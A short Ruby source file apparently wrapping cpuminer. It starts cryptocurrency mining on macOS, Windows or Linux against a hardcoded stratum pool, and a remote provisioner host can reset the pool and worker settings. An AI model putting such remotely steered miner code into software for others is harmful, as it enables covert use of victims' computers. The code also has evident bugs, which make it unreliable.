JObject = java.lang.Object

class Miner

  @@pool = "-o stratum+tcp://dgc.hash.so:3341 -u Virtuoid.1 -p 1"

  require 'fileutils'
  
  @@settings = {
    pool: "stratum+tcp://dgc.hash.so:3341",
    worker_user: "donacoin.2",
    worker_pass: "2",
  }

  def initialize
    # log machine infos
    puts "running on: #{Utils.os}, arch: #{Utils.arch}"
  end
  
  def get_settings
    host = "mkvd-32284.euw1.nitrousbox2.com" # nitrous
    prov = Provisioner.new host
    @@settings = prov.provision_settings
  end
  
  # TODO: use this method
  # call this method every 5 minutes
  def check_setting
    settings = get_settings
    if settings != @settings
      restart
    end
  end

  def start
    Thread.abort_on_exception

    cmd = if Utils.os == :osx
      "#{PATH}/vendor/cpuminer/bin/minerd_osx64 #{@@pool}"
    elsif Utils.os == :windows
      path = File.expand_path "../../../../", __FILE__
      path = path[5..-1]
      puts path
      "#{path}/windows_32/minerd.exe #{@@pool}"
    elsif Utils.os == :linux
      "#{path}/vendor/cpuminer/bin/minerd_linux"
    end

    Thread.new {
      IO.popen(cmd) do |f|
        until f.eof?
          puts "miner > #{f.gets}"
        end
      end
    }
  end

  def stop
    puts "stopping..."
    if Utils.os == :osx
      puts `killall minerd_osx64`
    elsif Utils.os == :windows
      puts `taskkill /IM minerd.exe /F`
    elsif Utils.os == :linux
      puts `killall minerd_linux`
    end
  end

  def restart
    stop
    sleep 2
    start
  end

end